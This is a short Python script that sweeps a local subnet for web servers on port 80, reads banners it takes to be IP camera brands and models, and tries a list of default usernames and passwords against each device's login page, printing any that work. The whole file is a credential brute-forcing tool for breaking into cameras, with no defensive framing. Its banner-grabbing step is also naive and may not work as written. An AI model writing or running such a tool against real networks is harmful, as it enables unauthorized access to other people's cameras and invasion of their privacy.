import socket
import threading
import requests
from queue import Queue
import netaddr

def ip_range(target_subnet):
    network = netaddr.IPNetwork(target_subnet)
    return [str(ip) for ip in network]

def portscan(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        return True
    except:
        return False

def get_camera(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    data = sock.recv(1024)
    brand = data.split()[0]
    model = data.split()[1]
    cameras.append({'ip': ip, 'brand': brand, 'model': model})

def bruteforce(ip, credentials):
    for username, password in credentials:
        try:
            url = f'http://{ip}/login.htm'
            r = requests.get(url, auth=(username, password))
            if r.status_code == 200:
                print(f'[+] Found valid creds: {username}:{password} at {ip}')
                break
        except:
            pass

try:
    target_subnet = "192.168.0.0/24"
    credentials = [('admin', 'password'), ('user', '12345')]

    cameras = []
    queue = Queue()
    for ip in ip_range(target_subnet):
        queue.put(ip)

    threads = [] 

    def scan(ip):
        if portscan(ip, 80):
            get_camera(ip, 80)
            bruteforce(ip, credentials)

    for i in range(256):
        thread = threading.Thread(target=scan, args=(queue.get(),))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    with open('cameras.txt', 'w') as f:
        for camera in cameras:
            f.write(f"{camera['ip']} {camera['brand']} {camera['model']}\n")
except Exception as e:
    print(e)
